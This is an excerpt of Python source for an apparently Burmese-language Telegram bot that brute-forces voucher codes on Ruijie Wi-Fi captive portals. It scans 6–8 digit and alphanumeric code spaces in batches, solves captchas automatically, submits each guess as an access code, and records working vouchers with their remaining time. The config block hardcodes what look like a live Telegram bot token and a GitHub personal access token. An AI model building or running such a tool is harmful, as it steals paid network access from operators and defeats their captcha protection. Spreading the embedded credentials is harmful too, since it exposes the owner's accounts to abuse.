...
#  Config
# ─────────────────────────────────────────────
BOT_TOKEN   = '8822467436:AAGnm5fI0QWa787Wr0yXj4ho3yOt2f5UIFE'
GITHUB_TOKEN = "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"
ADMIN_ID    = "7262926892"
REPO_OWNER  = "Almax95"
REPO_NAME   = "pp"
...
async def web_server():
    ...
    try:
        ...
        print(f"Web server could not start on port {port}: {e}")
...
async def help_command(message):
    help_text = (
        ...
        "🚀 *Getting Started*\n"
        "/start — Bot ကိုစတင်ပါ\n"
        "/input `<session_url>` — Session URL ထည့်သွင်းပါ\n\n"
        "🔍 *Scanning*\n"
        "/scan `6` — 6-digit codes များကိုရှာပါ\n"
        "/scan `7` — 7-digit codes များကိုရှာပါ\n"
        "/scan `8` — 8-digit codes များကိုရှာပါ\n"
        "/scan `ascii-lower` — Lowercase letters codes ရှာပါ\n"
        "/scan `all` — Mixed alphanumeric codes ရှာပါ\n"
        "/stop — လက်ရှိ scan ကိုရပ်တန့်ပါ\n\n"
        "📋 *Results*\n"
        "/result — ရှာတွေ့ထားသော codes များကြည့်ပါ\n"
        "/recheck — ရှာတွေ့ထားသော codes များပြန်စစ်ပါ\n\n"
        "ℹ️ *Steps:*\n"
        "1️⃣ /input `<url>` ဖြင့် Session URL ထည့်ပါ\n"
        "2️⃣ /scan `<mode>` ဖြင့် scan စတင်ပါ\n"
        "3️⃣ /result ဖြင့် တွေ့ရှိသော codes ကြည့်ပါ"
    )
...
# ─────────────────────────────────────────────
#  GitHub periodic save scheduler
# ─────────────────────────────────────────────
...
# ─────────────────────────────────────────────
#  Captcha helpers  (restored from bot(3).py)
# ─────────────────────────────────────────────
...
# ─────────────────────────────────────────────
#  Balance / expiry helper  (from time.py)
#  Uses the ACTIVE session_id obtained after a
#  successful voucher login (token param).
# ─────────────────────────────────────────────
...
async def Code_Expires_Date(active_session_id):
    """
    Fetch plan name and remaining time using the ACTIVE session_id
    extracted from the logon redirect URL (token= param).
    This mirrors the approach in time.py's send() function.
    """
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
...
#  Voucher check
#
#  • apiVersion = 1  →  captcha required
#  • Full captcha solve loop (bot(3).py) restored
#  • On success, extract active session_id from
#    the logonUrl token param (time.py approach)
#    and pass it to Code_Expires_Date for an
#    accurate balance read.
# ─────────────────────────────────────────────
BATCH_SIZE = 1500
...
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    ...
    for _attempt in range(3):
        ...
        async with aiohttp.ClientSession(
            ...
            # Get inactive session_id from the portal URL
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            # ── Full captcha solve loop (restored from bot(3).py) ──
            auth_code = None
            for _ in range(8):
                try:
            ...
            # ── apiVersion=1 with captcha authCode ──
            data = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
    ...
    if 'logonUrl' in response:
        ...
        # ── Extract active session_id from token param (time.py approach) ──
        try:
            active_session_id = re.search(r'token=([a-zA-Z0-9]+)', response).group(1)
        except Exception:
            active_session_id = session_id   # fallback to inactive session_id

        if chat_id not in success_texts:
            success_texts[chat_id] = []

        expire_date = await Code_Expires_Date(active_session_id)
        ...
        # ── Extract active session_id for limited codes too ──
        try:
            active_session_id = re.search(r'token=([a-zA-Z0-9]+)', response).group(1)
        except Exception:
